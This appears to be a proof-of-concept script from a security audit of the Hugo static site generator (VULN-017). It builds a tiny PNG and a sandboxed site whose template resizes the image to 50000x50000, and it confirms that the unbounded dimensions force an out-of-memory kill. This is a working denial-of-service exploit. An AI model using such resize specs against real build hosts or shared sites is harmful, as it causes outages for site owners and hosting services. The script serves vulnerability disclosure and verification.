#!/usr/bin/env python3
"""
VULN-017 — Image pipeline has no target-dimension bound (and no source-pixel cap) -> build DoS
==============================================================================================

VULN-ID     : VULN-017
Title       : .Resize/.Fit target Width/Height are unbounded -> multi-GB allocation -> OOM
Vuln file   : targets/hugo/resources/images/config.go:299,308 (target dims, no upper bound)
              targets/hugo/resources/images/codec.go:184-198 (source decode, no max-megapixel)
CWE         : CWE-789 / CWE-409 (uncontrolled memory allocation from user input)

The flaw
--------
Hugo parses caller-supplied resize dimensions with no upper bound:

    c.Width,  err = strconv.Atoi(first)    // config.go:299 — no ceiling
    c.Height, err = strconv.Atoi(second)   // config.go:308 — no ceiling

(Contrast Quality, which IS bounded 1..100 in the same file.) A tiny 1x1 source image
resized to 50000x50000 forces a destination RGBA buffer of 50000*50000*4 ≈ 10 GB.

Exploitation idea
-----------------
A page bundle contains a tiny valid PNG; the theme template resizes it. Change ONLY
the target dimensions: 50x50 builds fine; 50000x50000 OOM-kills a 1 GB-capped build.

What a successful run proves
---------------------------
The allocation is driven purely by the unbounded, caller-supplied target dimensions:
identical site + image, only the resize spec differs, and the large spec exhausts
the build host's memory — a build-time DoS reachable by any content author whose
image a theme processes.
"""
import os
import struct
import sys
import zlib

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

VULN = "VULN-017"
MEM = os.environ.get("MEM_CAP", "1g")


def make_png(w: int = 8, h: int = 8) -> bytes:
    """Build a minimal, valid RGBA PNG with correct chunk CRCs (no PIL dependency)."""
    def chunk(typ: bytes, data: bytes) -> bytes:
        c = typ + data
        return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0)          # 8-bit, color type 6 (RGBA)
    raw = b"".join(b"\x00" + b"\xff\x00\x00\xff" * w for _ in range(h))  # filter byte + red pixels
    idat = zlib.compress(raw, 9)
    return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


PNG_1x1 = make_png(8, 8)  # a tiny, valid source image (the "few-KB source" in the finding)


def site_with_resize(spec: str) -> dict:
    # A leaf bundle (index.md + pic.png). The single template resizes the image and
    # forces the transform by taking its RelPermalink (publish => the resize runs).
    return {
        "hugo.toml": "baseURL='http://localhost/'\ntitle='h17'\n"
                     "disableKinds=['taxonomy','term','sitemap','rss','404']\n",
        "content/posts/bomb/index.md": "---\ntitle: bomb\n---\n",
        "content/posts/bomb/pic.png": PNG_1x1,
        "layouts/_default/single.html":
            '{{ with .Resources.GetMatch "pic.png" }}'
            '{{ (.Resize "%s").RelPermalink }}{{ end }}\n' % spec,
        "layouts/index.html": "home\n",
    }


def build(spec: str, mem: str, timeout=120):
    site = C.make_site(__file__, site_with_resize(spec), name="buildsite_" + spec.replace("x", "_"))
    # render to disk so the image is actually published (transform executes)
    return C.run_hugo(site, render_to_memory=False, network="none", memory=mem, timeout=timeout)


def main() -> int:
    C.banner(VULN, "Unbounded image resize dimensions -> build OOM",
             info="exercising resources/images/config.go target Width/Height parse (no upper bound)",
             target="throwaway `hugo` build capped at %s RAM" % MEM)

    # ---- Control: a sane resize builds fine (site + image are valid) ------------
    C.log("SETUP", "control build: .Resize \"50x50\" (tiny allocation)")
    rc0, out0, _ = build("50x50", "2g", timeout=90)
    if rc0 != 0:
        C.log("FAIL", f"control build failed (rc={rc0}); cannot attribute the DoS:\n{out0[-800:]}")
        print(f"==> {VULN}: FAILED — control broken")
        return 1
    C.log("INFO", "control build succeeded (rc=0): image resource + resize pipeline are valid")

    # ---- Attack: only the target dimensions change -----------------------------
    C.log("STEP", f"attack build: .Resize \"50000x50000\"  (~10 GB dest buffer) under --memory={MEM}")
    rc1, out1, _ = build("50000x50000", MEM, timeout=120)
    with open(os.path.join(os.path.dirname(__file__), "response.txt"), "w") as fh:
        fh.write(f"control(.Resize 50x50) rc={rc0}\n\nattack(.Resize 50000x50000) rc={rc1}\n---\n{out1[-2000:]}")

    oom = rc1 == 137 or rc1 == 124 or ("out of memory" in out1.lower()) or ("signal: killed" in out1.lower()) \
        or ("cannot allocate" in out1.lower())
    C.log("PROOF", f"attack build rc={rc1} (137=OOM-kill, 124=timeout)")

    if oom:
        C.log("OK", "exploit confirmed — an unbounded, caller-supplied resize dimension drove a ~10 GB "
                    "allocation that OOM-killed the build, while the same image with a 50x50 resize built "
                    "fine. Build-time memory DoS from a few-byte image + a theme that resizes it.")
        print(f"==> {VULN}: CONFIRMED — unbounded image resize dimensions OOM-kill the build")
        return 0
    C.log("FAIL", f"attack build did not OOM (rc={rc1}); a dimension bound may exist:\n{out1[-800:]}")
    print(f"==> {VULN}: FAILED — no OOM; check for a dimension guard")
    return 1


if __name__ == "__main__":
    sys.exit(main())
